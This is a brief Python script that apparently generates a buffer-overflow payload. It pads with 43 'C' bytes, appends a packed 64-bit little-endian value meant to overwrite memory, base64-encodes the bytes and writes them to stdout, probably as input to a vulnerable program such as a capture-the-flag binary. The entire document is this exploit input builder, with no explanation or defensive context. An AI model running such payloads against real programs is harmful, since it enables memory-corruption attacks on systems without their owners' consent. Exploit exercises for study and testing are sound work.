
import sys
import struct
import base64

buf = b'CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC'
buf += struct.pack('<Q', 10611789505241103824)
buf = base64.b64encode(buf)
buf += b'\n'

sys.stdout.buffer.write(buf)
